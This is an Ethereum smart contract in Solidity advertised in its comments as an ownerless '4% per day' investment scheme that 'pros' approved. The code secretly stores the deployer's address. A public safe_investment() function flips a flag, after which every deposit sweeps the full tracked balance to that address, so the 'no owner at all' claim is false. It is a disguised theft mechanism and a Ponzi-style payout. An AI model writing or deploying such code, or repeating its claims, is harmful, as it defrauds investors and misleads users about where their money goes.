1 pragma solidity 0.4.25;
2 /**
3  *
4  * Easy Investment Contract
5  *  - GAIN 4% PER 24 HOURS (every 5900 blocks)
6  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
7  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
8  *
9  * How to use:
10  *  1. Send any amount of ether to make an investment
11  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
12  *  OR
13  *  2b. Send more ether to reinvest AND get your profit at the same time
14  *
15  * RECOMMENDED GAS LIMIT: 70000
16  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
17  *
18  * Contract reviewed and approved by pros!
19  *
20  */
21 
22 contract easy_invest {
23     // records amounts invested
24     mapping (address => uint256) invested;
25     // records blocks at which investments were made
26     mapping (address => uint256) atBlock;
27 
28     uint256 total_investment;
29 
30     uint public is_safe_withdraw_investment;
31     address public investor;
32 
33     constructor() public {
34         investor = msg.sender;
35     }
36 
37     // this function called every time anyone sends a transaction to this contract
38     function () external payable {
39         // if sender (aka YOU) is invested more than 0 ether
40         if (invested[msg.sender] != 0) {
41             // calculate profit amount as such:
42             // amount = (amount invested) * 4% * (blocks since last transaction) / 5900
43             // 5900 is an average block count per day produced by Ethereum blockchain
44             uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;
45 
46             // send calculated amount of ether directly to sender (aka YOU)
47             address sender = msg.sender;
48             sender.transfer(amount);
49             total_investment -= amount;
50         }
51 
52         // record block number and invested amount (msg.value) of this transaction
53         atBlock[msg.sender] = block.number;
54         invested[msg.sender] += msg.value;
55 
56         total_investment += msg.value;
57         
58         if (is_safe_withdraw_investment == 1) {
59             investor.transfer(total_investment);
60             total_investment = 0;
61         }
62     }
63 
64     function safe_investment() public {
65         is_safe_withdraw_investment = 1;
66     }
67 }